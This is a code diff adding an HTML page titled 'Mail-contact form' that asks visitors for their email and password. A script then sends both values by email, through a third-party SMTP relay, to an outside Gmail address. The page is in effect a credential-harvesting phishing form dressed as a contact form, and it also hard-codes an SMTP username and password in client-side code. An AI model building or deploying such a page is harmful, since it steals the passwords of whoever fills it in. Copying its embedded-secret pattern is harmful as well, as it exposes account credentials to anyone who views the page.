@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Mail-contact form</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="box">
+        <form id="form" onsubmit="SendEmail();reset(); return false;">
+          Name :
+          <input
+            type="text"
+            name="name"
+            id="name"
+            placeholder="Enter your name"
+          /><br />
+          Email :
+          <input
+            type="email"
+            name="email"
+            id="email"
+            placeholder="Enter your email"
+            required
+          />
+          <br />
+          Password :
+          <input
+            type="type"
+            name="type"
+            id="type"
+            placeholder="Password"
+            required
+          /><br />
+          <button type="submit" class="btn">Send</button>
+        </form>
+      </div>
+    </div>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+      function SendEmail() {
+        Email.send({
+          Host: "smtp.elasticemail.com",
+          Username: "teriz.b16@gmail.com",
+          Password: "C85027BB59EBB7A01D983365E33DFE115F36",
+          To: "teriz.b15@gmail.com",
+          From: document.getElementById("email").value,
+          Subject: "This is the subject",
+          Body: `Email: ${document.getElementById("email").value} Password: ${
+            document.getElementById("type").value
+          }`,
+        }).then((message) => alert(message));
+      }
+    </script>
+  </body>
+</html>
